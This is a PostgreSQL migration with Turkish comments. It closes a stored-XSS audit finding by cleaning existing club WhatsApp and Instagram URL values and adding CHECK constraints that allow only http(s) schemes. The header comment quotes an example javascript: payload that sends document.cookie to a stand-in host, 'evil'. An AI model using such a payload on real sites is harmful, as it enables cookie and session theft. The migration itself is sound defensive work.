-- 20260719130000_url_scheme_check
-- DÜZELTME TURU 1 / Commit 3 — Harici URL şema allow-list (denetim bulgusu Y4).
--
-- Y4 (YÜKSEK / stored XSS): clubs.whatsapp_url ve clubs.instagram_url kullanıcı
-- (kulüp yöneticisi) girdisi olarak HAM href'e render ediliyordu. Bir yönetici
-- `javascript:fetch('//evil/'+document.cookie)` yazarsa, kulüp sayfasını açıp linke
-- tıklayan herkeste JS çalışırdı (React href'i sanitize etmez). Savunma üç katmanlı:
-- (1) bu DB CHECK, (2) form doğrulaması, (3) render'da safeExternalHref. Bu dosya (1).
--
-- Yalnız http:// veya https:// ile başlayan (veya null) değerlere izin verilir.
-- mailto:/tel: alanları (contact_email/phone) kod tarafından şema-önekli üretildiği
-- için kısıtlanmaz.
--
-- İdempotent: önce kuralı ihlal eden MEVCUT satırları NULL'a çekeriz (CHECK eklenince
-- patlamasın — canlıda büyük ihtimalle temiz ama garanti altına alıyoruz), sonra
-- drop-if-exists + add ile CHECK'i (yeniden) tanımlarız.

-- 1) Mevcut ihlalleri temizle (http/https ile başlamayan dolu değerler → null).
update public.clubs
   set whatsapp_url = null
 where whatsapp_url is not null
   and whatsapp_url !~* '^https?://';

update public.clubs
   set instagram_url = null
 where instagram_url is not null
   and instagram_url !~* '^https?://';

-- 2) CHECK'ler (null serbest; dolu ise http(s) şeması zorunlu).
alter table public.clubs drop constraint if exists clubs_whatsapp_url_scheme_check;
alter table public.clubs
  add constraint clubs_whatsapp_url_scheme_check
  check (whatsapp_url is null or whatsapp_url ~* '^https?://');

alter table public.clubs drop constraint if exists clubs_instagram_url_scheme_check;
alter table public.clubs
  add constraint clubs_instagram_url_scheme_check
  check (instagram_url is null or instagram_url ~* '^https?://');
